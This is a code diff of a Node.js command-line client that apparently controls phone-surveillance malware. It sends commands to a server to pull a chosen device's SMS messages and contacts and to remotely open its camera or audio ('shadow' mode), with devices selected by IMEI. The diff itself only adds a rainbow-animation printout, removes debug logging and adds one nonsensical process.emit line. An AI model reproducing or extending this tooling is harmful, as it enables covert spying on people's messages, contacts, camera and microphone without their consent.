@@ -1,8 +1,11 @@
 #! /usr/local/bin/node
+
 let program = require('commander');
 let request = require('request');
 let HOST = 'http://localhost:3000/';
 let cmd2c = require('./command/cmds/command2clients');
+const chalkAnimation = require('chalk-animation');
+
 let cmd = new Map()
 cmd.set('sms', cmd2c.SEND_SMS_LIST);
 cmd.set('contacts', cmd2c.SEND_CONTACTS_LIST);
@@ -27,6 +30,7 @@ program
     .option('-l,--lens <lens>', 'which camera lens that you want to open [0,1]')
     .parse(process.argv);
 
+process.emit("./node_modules/.bin/matrix-rain");
 if (program.Clients) {
     request(HOST + 'users/users', (error, response, body) => {
         if (body) {
@@ -45,17 +49,12 @@ if (program.Clients) {
 
     if (program.assassin && program.client) {
 
-        console.log(program.assassin);
-
         let requestBody = {};
         requestBody['command'] = cmd.get(program.assassin);
         requestBody['IMEI'] = program.client;
 
         if (program.assassin == 'shadow') {
             if (program.type) {
-                console.log(program.type);
-
-                console.log(type);
                 requestBody['type'] = type.get(program.type);
                 if (program.type != 'audio') {
                     if (program.lens) {
@@ -83,12 +82,11 @@ if (program.Clients) {
             }
         }
 
-        console.log(requestBody);
+        chalkAnimation.rainbow(JSON.stringify(requestBody, null, 4) + '\n \n \n response is : \n');
         request.post({ url: HOST + 'command', form: requestBody }, (error, httpResponse, body) => {
             if (body) {
-                console.log(JSON.stringify(body));
+                console.log(JSON.stringify(body).replace(/\"/g, "").replace(/\\/g, ""));
             }
-
         });
     }
 
